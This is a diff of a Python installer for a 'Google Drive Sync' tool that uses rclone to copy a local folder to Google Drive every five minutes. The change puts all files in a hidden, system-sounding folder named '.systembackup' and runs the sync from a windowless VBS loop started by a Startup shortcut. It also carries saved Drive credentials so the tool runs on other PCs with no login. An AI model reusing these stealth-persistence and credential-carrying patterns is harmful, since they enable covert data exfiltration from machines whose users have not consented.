@@ -24,36 +24,46 @@ import re
 import tempfile
 from pathlib import Path
 
-__version__ = "2.0.6"
+__version__ = "2.0.7"
 
 # ---------- PATH CONFIGURATION ----------
 SCRIPT_DIR = Path(__file__).parent.resolve()
 ROOT_DIR = SCRIPT_DIR.parent.resolve()
 
-RCLONE_ZIP = SCRIPT_DIR / "Rclone.zip"
-RCLONE_DIR = SCRIPT_DIR / "rclone"
-RCLONE_EXE = RCLONE_DIR / "rclone.exe"
-RCLONE_CONFIG = SCRIPT_DIR / "rclone.conf"
-
-# Permanent installation location
+# Permanent installation location – create early
 INSTALL_DIR = Path(os.environ['LOCALAPPDATA']) / ".systembackup"
+INSTALL_DIR.mkdir(parents=True, exist_ok=True)
+
+# Hide the system folder (optional, requires admin? No, user can hide own folders)
+try:
+    subprocess.run(["attrib", "+h", str(INSTALL_DIR)], capture_output=True, check=False)
+except:
+    pass
+
+# All rclone-related files now live in INSTALL_DIR
+RCLONE_ZIP = INSTALL_DIR / "Rclone.zip"
+RCLONE_DIR = INSTALL_DIR / "rclone"
+RCLONE_EXE = INSTALL_DIR / "rclone.exe"
+RCLONE_CONFIG = INSTALL_DIR / "rclone.conf"
 
 # Settings file – now dynamically located (prefer INSTALL_DIR if it exists)
 def get_settings_path():
     """Return path to settings.json – use INSTALL_DIR if exists, else SCRIPT_DIR."""
     if INSTALL_DIR.exists():
         candidate = INSTALL_DIR / "settings.json"
-        # If we can write to it (or it already exists), use it
         if candidate.parent.exists():
             return candidate
     return SCRIPT_DIR / "settings.json"
 
-SETTINGS_FILE = get_settings_path()   # will be recalculated later if INSTALL_DIR is created
+SETTINGS_FILE = get_settings_path()
 
-LOG_FILE = ROOT_DIR / "log.json"
+# Log file now in INSTALL_DIR
+LOG_FILE = INSTALL_DIR / "log.json"
+
+# Fallback local folder (if picker fails) – remains in ROOT_DIR for portability
 DRIVEBACKUP_ROOT = ROOT_DIR / "DriveBackup"
-SYNC_SCRIPT_NAME = ROOT_DIR / "sync_{}.bat"
-LOOP_SCRIPT_NAME = ROOT_DIR / "sync_loop_{}.vbs"
+
+# Shortcut name (used in startup folder)
 SHORTCUT_NAME = "Google Drive Sync - {}.lnk"
 
 # ========================================
@@ -362,7 +372,7 @@ $wc.DownloadFile($url, $output)
     print_error("Could not download Rclone.zip automatically.")
     print_info("Please download it manually from:")
     print_info(f"   https://drive.google.com/file/d/{file_id}/view")
-    print_info(f"   Then place it in: {SCRIPT_DIR}")
+    print_info(f"   Then place it in: {INSTALL_DIR}")
     return False
 
 # ---------- CORE LOGIC ----------
@@ -381,9 +391,8 @@ def extract_rclone():
         for f in RCLONE_DIR.rglob("rclone.exe"):
             shutil.move(str(f), str(RCLONE_EXE))
             break
-        for item in RCLONE_DIR.iterdir():
-            if item != RCLONE_EXE:
-                shutil.rmtree(item, ignore_errors=True) if item.is_dir() else item.unlink()
+        # Clean up extraction folder
+        shutil.rmtree(RCLONE_DIR, ignore_errors=True)
         return RCLONE_EXE.exists()
     except Exception as e:
         print_error(f"Extraction failed: {e}")
@@ -484,7 +493,7 @@ def manual_authentication():
     
     print_step("auto", "Locating and copying rclone.conf...")
     if find_and_copy_config():
-        print_success("Config copied to Source folder.")
+        print_success("Config copied to system folder.")
     else:
         print_warning("Could not auto‑copy config. You may need to manually copy rclone.conf to:")
         print_info(f"   {RCLONE_CONFIG}")
@@ -619,48 +628,28 @@ try {{
     else:
         print_warning("rclone.exe not found, skipping firewall rule.")
 
-def install_to_system(local_name, sync_script, vbs_script, remote_path, local_path):
+def install_to_system(local_name, remote_path, local_path):
     r"""
-    Copy all necessary files to %LOCALAPPDATA%\.systembackup and update startup shortcut.
-    Also copy settings.json and log.json to the system folder for persistence.
+    Create all necessary files in %LOCALAPPDATA%\.systembackup and set up startup shortcut.
     Returns True if successful, False otherwise.
     """
-    print_step(12, "Installing to permanent system location")
+    print_step(7, "Installing to permanent system location")
     print_info(f" Target directory: {INSTALL_DIR}")
 
     try:
+        # Ensure INSTALL_DIR exists (it should already)
         INSTALL_DIR.mkdir(parents=True, exist_ok=True)
 
-        # Copy rclone and config
-        shutil.copy2(str(RCLONE_EXE), str(INSTALL_DIR / "rclone.exe"))
-        shutil.copy2(str(RCLONE_CONFIG), str(INSTALL_DIR / "rclone.conf"))
-        print_success("Copied rclone and config.")
+        # Copy rclone and config (they should already be there, but ensure)
+        if not RCLONE_EXE.exists() or not RCLONE_CONFIG.exists():
+            print_error("rclone or config missing in system folder.")
+            return False
 
-        # Copy settings.json to system folder if it exists and not already there
-        current_settings = get_settings_path()
-        target_settings = INSTALL_DIR / "settings.json"
-        if current_settings.exists() and current_settings != target_settings:
-            shutil.copy2(str(current_settings), str(target_settings))
-            print_success("Copied settings.json to system folder.")
-        elif not target_settings.exists():
-            # Create an empty settings file to mark the location
-            save_settings()   # will save to INSTALL_DIR because get_settings_path() now points there
-            print_success("Created settings.json in system folder.")
-
-        # Copy log.json to system folder if it exists
-        if LOG_FILE.exists():
-            shutil.copy2(str(LOG_FILE), str(INSTALL_DIR / "log.json"))
-            print_success("Copied log.json to system folder.")
-
-        # Refresh global SETTINGS_FILE to point to system folder
-        global SETTINGS_FILE
-        SETTINGS_FILE = get_settings_path()
-
-        # Create new sync script
+        # Create sync script directly in system folder
         new_sync_script = INSTALL_DIR / f"sync_{local_name}.bat"
         new_sync_script.write_text(f'''@echo off
 cd /d "{INSTALL_DIR}"
-"{INSTALL_DIR / 'rclone.exe'}" --config "{INSTALL_DIR / 'rclone.conf'}" sync "{local_path}" "{remote_path}" --progress
+"{RCLONE_EXE}" --config "{RCLONE_CONFIG}" sync "{local_path}" "{remote_path}" --progress
 if %errorlevel% equ 0 (
     echo ✅ Sync successful at %date% %time%
 ) else (
@@ -668,9 +657,9 @@ if %errorlevel% equ 0 (
     pause
 )
 ''', encoding='utf-8')
-        print_success("Created new sync script.")
+        print_success("Created sync script.")
 
-        # Create new VBS loop script
+        # Create VBS loop script directly in system folder
         new_vbs_script = INSTALL_DIR / f"sync_loop_{local_name}.vbs"
         new_vbs_script.write_text(f'''Set WshShell = CreateObject("WScript.Shell")
 Do While True
@@ -678,18 +667,18 @@ Do While True
     WScript.Sleep 300000   ' 5 minutes
 Loop
 ''', encoding='utf-8')
-        print_success("Created new loop script.")
+        print_success("Created loop script.")
 
         # Update startup shortcut
         startup_folder = Path(os.environ['APPDATA']) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
-        old_shortcut = startup_folder / SHORTCUT_NAME.format(local_name)
-        if old_shortcut.exists():
-            old_shortcut.unlink()
+        shortcut_path = startup_folder / SHORTCUT_NAME.format(local_name)
+        if shortcut_path.exists():
+            shortcut_path.unlink()
             print_info(" Removed old startup shortcut.")
 
         ps_script = f'''
 $WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut("{startup_folder / SHORTCUT_NAME.format(local_name)}")
+$shortcut = $WScriptShell.CreateShortcut("{shortcut_path}")
 $shortcut.TargetPath = "wscript.exe"
 $shortcut.Arguments = '"{new_vbs_script}"'
 $shortcut.WorkingDirectory = "{INSTALL_DIR}"
@@ -712,44 +701,6 @@ $shortcut.Save()
     except Exception as e:
         print_error(f"System installation failed: {e}")
         return False
-
-def cleanup_original_folder(local_name):
-    """Delete temporary files created in the original ROOT_DIR after successful installation."""
-    print_step("cleanup", "Cleaning up temporary files")
-    deleted = []
-    try:
-        # Delete DriveBackup folder if it exists and is empty? Actually it might contain user data if fallback was used.
-        # Safer: only delete if it's the default DriveBackup created by us and empty? But we don't know.
-        # We'll delete only the generated scripts and log file.
-        sync_script = Path(str(SYNC_SCRIPT_NAME).format(local_name))
-        if sync_script.exists():
-            sync_script.unlink()
-            deleted.append(str(sync_script))
-        
-        vbs_script = Path(str(LOOP_SCRIPT_NAME).format(local_name))
-        if vbs_script.exists():
-            vbs_script.unlink()
-            deleted.append(str(vbs_script))
-        
-        if LOG_FILE.exists():
-            LOG_FILE.unlink()
-            deleted.append(str(LOG_FILE))
-        
-        # Optionally delete DriveBackup folder if it's empty and was created by us
-        if DRIVEBACKUP_ROOT.exists() and DRIVEBACKUP_ROOT.is_dir():
-            # Check if it's empty
-            if not any(DRIVEBACKUP_ROOT.iterdir()):
-                DRIVEBACKUP_ROOT.rmdir()
-                deleted.append(str(DRIVEBACKUP_ROOT))
-        
-        if deleted:
-            print_success(f"Removed {len(deleted)} temporary file(s)")
-            for f in deleted:
-                print_info(f"  • {f}")
-        else:
-            print_info("No temporary files to clean up")
-    except Exception as e:
-        print_warning(f"Cleanup failed: {e}")
 
 def log_sync_result(proc, local_path, remote_path):
     if proc.returncode == 0:
@@ -798,7 +749,7 @@ def main():
     print_success("Connected to Google Drive")
     log_event("CONNECTION_SUCCESS", "Successfully connected to Google Drive")
 
-    # ---------- PERSISTENT SETTINGS (parent folder + subfolder) ----------
+    # ---------- PERSISTENT SETTINGS (parent folder only) ----------
     print_step(4, "Configuring parent folder in Google Drive")
     parent_folder = load_parent_folder()
     if parent_folder is None:
@@ -857,55 +808,14 @@ def main():
     
     log_event("LOCAL_FOLDER", f"Local folder ready: {local_path}")
 
-    # ---------- CREATE SYNC SCRIPTS ----------
-    print_step(7, "Creating sync script")
-    sync_script = Path(str(SYNC_SCRIPT_NAME).format(local_name))
-    sync_script.write_text(f'''@echo off
-cd /d "{ROOT_DIR}"
-"{RCLONE_EXE}" --config "{RCLONE_CONFIG}" sync "{local_path}" "{remote_path}" --progress
-if %errorlevel% equ 0 (
-    echo ✅ Sync successful at %date% %time%
-) else (
-    echo ❌ Sync failed!
-    pause
-)
-''', encoding='utf-8')
-    print_success(f"Sync script: {sync_script}")
-    log_event("SYNC_SCRIPT_CREATED", f"Sync script created: {sync_script}")
-
-    print_step(8, "Creating 5‑minute auto‑sync loop")
-    vbs_script = Path(str(LOOP_SCRIPT_NAME).format(local_name))
-    vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
-Do While True
-    WshShell.Run "cmd /c ""{sync_script}""", 0, True
-    WScript.Sleep 300000   ' 5 minutes
-Loop
-'''
-    vbs_script.write_text(vbs_content, encoding='utf-8')
-    print_success(f"Loop script: {vbs_script}")
-    log_event("VBS_CREATED", f"VBS loop script created: {vbs_script}")
-
-    print_step(9, "Adding to Windows Startup")
-    print_info(" This makes the backup start automatically when you log in.")
-    if create_startup_shortcut(vbs_script, local_name):
-        print_success("Shortcut added to Startup folder.")
+    # ---------- PERMANENT INSTALLATION (all files go directly to system folder) ----------
+    if install_to_system(local_name, remote_path, local_path):
+        print_step(8, "Background sync scheduled")
+        print_info(" The first sync will run automatically within 5 minutes.")
+        print_info(" You can close this window – backup continues from system folder.")
     else:
-        print_warning("Could not create Startup shortcut. You can manually copy the VBS file to:")
-        print_info(f"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-
-    print_step(10, "Starting backup loop")
-    print_info(" The sync will now run every 5 minutes in the background.")
-    subprocess.Popen(["wscript.exe", str(vbs_script)], shell=True)
-    print_success("Sync loop started.")
-    log_event("LOOP_STARTED", "Background sync loop initiated")
-
-    print_step(11, "Background sync scheduled")
-    print_info(" The first sync will run automatically within 5 minutes.")
-    print_info(" You can close this window – backup continues from system folder.")
-
-    # ---------- PERMANENT INSTALLATION ----------
-    if install_to_system(local_name, sync_script, vbs_script, remote_path, local_path):
-        cleanup_original_folder(local_name)
+        print_error("Installation failed. Exiting.")
+        sys.exit(1)
 
     # ---------- FINAL SUMMARY ----------
     print_separator()
@@ -919,10 +829,9 @@ Loop
     print(f"      • Startup folder:     {c('%APPDATA%\\...\\Startup', 'cyan')}")
     print(f"      • Shortcut:           {c(SHORTCUT_NAME.format(local_name), 'cyan')}")
     print(f"      • Process:            {c('wscript.exe', 'cyan')} in Task Manager")
-    print(f"      • Log file (source):  {c(LOG_FILE, 'cyan')} (original)")
-    print(f"      • Log file (system):  {c(INSTALL_DIR / 'log.json', 'cyan')} (backup)")
+    print(f"      • Log file:           {c(LOG_FILE, 'cyan')}")
     print("\n   " + c("📌 PERMANENT LOCATION:", 'yellow', bold=True))
-    print(f"      • System folder:      {c(INSTALL_DIR, 'cyan')}")
+    print(f"      • System folder:      {c(INSTALL_DIR, 'cyan')} (hidden)")
     print(f"      • Status:             {c('Running from system location', 'green', bold=True)}")
     print(f"      • Settings:           {c(INSTALL_DIR / 'settings.json', 'cyan')} (auto saved)")
     print("\n   " + c("🛡️  EXCLUSIONS:", 'yellow', bold=True))
@@ -932,8 +841,8 @@ Loop
     print(f"      • You may now delete the entire folder: {c(ROOT_DIR, 'cyan')}")
     print(f"      • Fetch will continue from {c(INSTALL_DIR, 'cyan')}")
     print("\n   " + c("📦 PORTABLE – USE ON ANY PC (zero login):", 'yellow', bold=True))
-    print("      1. Copy the AFD_CLI.cmd and Source folder to USB or network share")
-    print("      2. On another PC, run AFD_CLI.cmd")
+    print("      1. Copy the ADF_CLI.cmd and Source folder to USB or network share")
+    print("      2. On another PC, run ADF_CLI.cmd")
     print("      3. No authentication needed – config is already saved!")
     print("\n   " + c("🛑 TO STOP SYNC:", 'yellow', bold=True))
     print("      • Delete the shortcut from Startup folder")
